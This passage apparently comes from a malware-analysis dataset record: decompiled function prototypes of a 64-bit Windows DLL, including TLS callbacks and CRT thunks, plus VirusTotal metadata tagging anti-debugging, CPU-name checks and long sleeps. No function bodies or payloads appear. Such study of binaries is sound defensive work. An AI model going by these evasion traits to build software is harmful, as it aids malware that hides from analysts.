    "        int a10);",
    "int sub_62742580(wchar_t *a1, size_t a2, const wchar_t *a3, ...);",
    "CHAR *__fastcall sub_627425A0(LPCWCH lpWideCharStr);",
    "WCHAR *__fastcall sub_62742640(_PROCESS_INFORMATION *lpMultiByteStr);",
    "CHAR *__fastcall sub_627426C0(LPCWCH lpWideCharStr);",
    "WCHAR *__fastcall sub_62742760(_PROCESS_INFORMATION *lpMultiByteStr);",
    "_BYTE *__fastcall sub_62742820(__int64 a1);",
    "WCHAR *__fastcall sub_627428E0(_BYTE *a1, unsigned int a2);",
    "CHAR *__fastcall sub_62742960(",
    "        _DWORD *a1,",
    "        _DWORD *a2,",
    "        const WCHAR *a3,",
    "        const WCHAR *a4,",
    "        const WCHAR *lpWideCharStr,",
    "        const WCHAR *a6,",
    "        const WCHAR *a7,",
    "        const char *a8,",
    "        int a9,",
    "        unsigned int *a10);",
    "int __fastcall sub_62742C40(char *Destination);",
    "_DWORD *__fastcall sub_62742CD0(_DWORD *a1, int a2, const char *a3, int a4, DWORD *a5);",
    "_DWORD *__fastcall sub_62743070(_DWORD *a1, int a2, const char *a3, int a4, _DWORD *a5);",
    "char *__fastcall sub_627431B0(_DWORD *a1);",
    "char *__fastcall sub_62743670(_DWORD *a1, int a2, const char *a3, int a4, _DWORD *a5);",
    "__int64 __fastcall sub_627437A0(__int64 a1, const void *a2, DWORD a3);",
    "_DWORD *__fastcall sub_62743890(",
    "        _DWORD *a1,",
    "        int a2,",
    "        __int64 a3,",
    "        const void *a4,",
    "        DWORD a5,",
    "        const char *a6,",
    "        int a7,",
    "        unsigned int *a8);",
    "void *__fastcall sub_627439E0(__int64 a1, DWORD *a2);",
    "_DWORD *__fastcall sub_62743B20(_DWORD *a1, int a2, __int64 a3, const char *a4, int a5, unsigned int *a6);",
    "__int64 sub_62743D10();",
    "WCHAR *__fastcall sub_62743EA0(_DWORD *a1, int a2, _PROCESS_INFORMATION *a3, const char *a4, int a5, DWORD *a6);",
    "char *__fastcall sub_627444A0(",
    "        _DWORD *a1,",
    "        int a2,",
    "        int a3,",
    "        int a4,",
    "        __int64 a5,",
    "        __int64 a6,",
    "        __int64 a7,",
    "        int a8,",
    "        const char *a9,",
    "        int a10,",
    "        unsigned int *a11);",
    "__int64 __fastcall sub_62744620(HMODULE hModule, __int64 a2, int a3);",
    "__int64 __fastcall sub_62744900(int a1, int a2);",
    "__int64 sub_62744940();",
    "__int64 sub_62744A30();",
    "__int64 __fastcall sub_62744B50(__int64 a1, const wchar_t *a2);",
    "__int64 sub_62745590();",
    "__int64 sub_627455E0();",
    "__int64 __fastcall sub_627458E0(HMODULE a1);",
    "__int64 __fastcall sub_62745A70(HMODULE a1, const wchar_t *a2);",
    "__int64 __fastcall sub_62745AC0(HMODULE a1);",
    "LPVOID __fastcall sub_62745B80(SIZE_T dwBytes);",
    "LPVOID __fastcall sub_62745BB0(LPVOID lpMem, SIZE_T dwBytes);",
    "BOOL __fastcall sub_62745BE0(LPVOID lpMem);",
    "_BOOL8 __fastcall sub_62745C10(_DWORD *a1);",
    "__int64 __fastcall sub_62745FF0(_BYTE *a1, __int64 a2, unsigned __int64 a3);",
    "char __fastcall sub_62746060(unsigned __int8 *a1, __int64 a2, __int64 a3, __int64 a4);",
    "void *__fastcall sub_627460D0(unsigned int *a1);",
    "_DWORD *__fastcall sub_62746B10(unsigned int *a1);",
    "_DWORD *__fastcall sub_62746BA0(unsigned int *a1);",
    "BOOL __fastcall sub_62746C30(__int64 a1);",
    "int sub_62746C70(wchar_t *a1, size_t a2, const wchar_t *a3, ...);",
    "WCHAR *__fastcall sub_62746C90(LPCCH lpMultiByteStr);",
    "__int64 __fastcall sub_62746D10(const WCHAR *a1, const void *a2, DWORD a3);",
    "__int64 __fastcall sub_62746DC0(int a1, const void *a2, DWORD a3, __int64 a4, const CHAR *a5, const CHAR *a6);",
    "void sub_62747270();",
    "__int64 __fastcall sub_62747580(__int64 a1, int a2);",
    "__int64 __fastcall sub_627475F0(_QWORD *a1);",
    "__int64 __fastcall sub_627477A0(WCHAR *String);",
    "__int64 __fastcall sub_62747840(__int64 a1, __int64 a2, __int64 a3, int a4, unsigned int a5);",
    "__int64 __fastcall sub_62747BA0(__int64 a1);",
    "_BOOL8 __fastcall sub_62747CC0(OLECHAR *psz);",
    "__int64 sub_62747EE0();",
    "_BOOL8 sub_62748210();",
    "__int64 __fastcall sub_62748230(WCHAR *String2);",
    "__int64 sub_627483E0();",
    "__int64 __fastcall sub_62748410(__int64 a1);",
    "void (*sub_62748420())(void);",
    "void sub_62748460();",
    "void sub_627484D0();",
    "LONGLONG sub_627484F0();",
    "void __fastcall  sub_627485D0(DWORD64 a1);",
    "__int64 __fastcall TlsCallback_1(__int64 a1, int a2);",
    "__int64 __fastcall TlsCallback_0(__int64 a1, int a2);",
    "void  sub_627487A0(char *Format, ...);",
    "int __fastcall sub_62748810(_QWORD *a1, char *a2, unsigned int a3);",
    "void sub_62748A20();",
    "__int64 __fastcall sub_62748D10(unsigned int *a1);",
    "__int64 sub_62748ED0();",
    "__int64 __fastcall sub_62748FD0(unsigned int **a1);",
    "void sub_62749180();",
    "__int64 __fastcall sub_627491F0(int a1, __int64 a2);",
    "__int64 __fastcall sub_62749270(int a1);",
    "__int64 __fastcall sub_62749300(__int64 a1, unsigned int a2);",
    "const char *__fastcall sub_62749470(char *Str2);",
    "__int64 __fastcall sub_62749510(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_627495A0(__int64 a1, __int64 a2, __int64 a3, __int64 a4);",
    "__int64 __fastcall sub_627495D0(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_62749640(__int64 a1, __int64 a2, __int64 a3, __int64 a4);",
    "__int64 __fastcall sub_62749670(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_62749700(unsigned int a1, __int64 a2);",
    "void sub_627497C0();",
    "void *__fastcall sub_627497D0();",
    "__int64 sub_62749810();",
    "// attributes: thunk",
    "int __cdecl wcsncmp(const wchar_t *String1, const wchar_t *String2, size_t MaxCount);",
    "// attributes: thunk",
    "size_t __cdecl wcslen(const wchar_t *String);",
    "// attributes: thunk",
    "wchar_t *__cdecl wcscpy(wchar_t *Destination, const wchar_t *Source);",
    "// attributes: thunk",
    "int __cdecl wcscmp(const wchar_t *String1, const wchar_t *String2);",
    "// attributes: thunk",
    "wchar_t *__cdecl wcscat(wchar_t *Destination, const wchar_t *Source);",
    "// attributes: thunk",
    "int __cdecl vfprintf(FILE *const Stream, const char *const Format, va_list ArgList);",
    "// attributes: thunk",
    "int __cdecl strncmp(const char *Str1, const char *Str2, size_t MaxCount);",
    "// attributes: thunk",
    "size_t __cdecl strlen(const char *Str);",
    "// attributes: thunk",
    "char *__cdecl strcpy(char *Destination, const char *Source);",
    "// attributes: thunk",
    "char *__cdecl strcat(char *Destination, const char *Source);",
    "// attributes: thunk",
    "void __cdecl srand(unsigned int Seed);",
    "// attributes: thunk",
    "_crt_signal_t __cdecl signal(int Signal, _crt_signal_t Function);",
    "// attributes: thunk",
    "int __cdecl rand();",
    "// attributes: thunk",
    "void *__cdecl memset(void *a1, int Val, size_t Size);",
    "// attributes: thunk",
    "void *__cdecl memcpy(void *a1, const void *Src, size_t Size);",
    "// attributes: thunk",
    "size_t __cdecl fwrite(const void *Buffer, size_t ElementSize, size_t ElementCount, FILE *Stream);",
    "// attributes: thunk",
    "void __cdecl free(void *Block);",
    "// attributes: thunk",
    "void *__cdecl calloc(size_t Count, size_t Size);",
    "// attributes: thunk",
    "void __cdecl  abort();",
    "// attributes: thunk",
    "void __cdecl initterm(_PVFV *First, _PVFV *Last);",
    "// attributes: thunk",
    "__int64 __fastcall amsg_exit(__int64 a1);",
    "__int64 __fastcall sub_62749900(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_627499E0(__int64 a1);",
    "FILE *__fastcall sub_62749A60(int a1);",
    "// attributes: thunk",
    "void *__cdecl realloc(void *Block, size_t Size);",
    "// attributes: thunk",
    "__int64 __fastcall unlock(__int64 a1, __int64 a2);",
    "// attributes: thunk",
    "__int64 __fastcall lock(__int64 a1);",
    "// attributes: thunk",
    "FILE *__cdecl _iob_func();"
  ],
  "virustotal": {
    "sha256": "d3b437ebe0504f8ff71d2025faabf84119c9aaccb38f34d4130f7c633ce4b37f",
    "type_tag": "pedll",
    "popular_threat_name": null,
    "tags": [
      "checks-cpu-name",
      "detect-debug-environment",
      "64bits",
      "pedll",
      "long-sleeps"
    ]
  }
}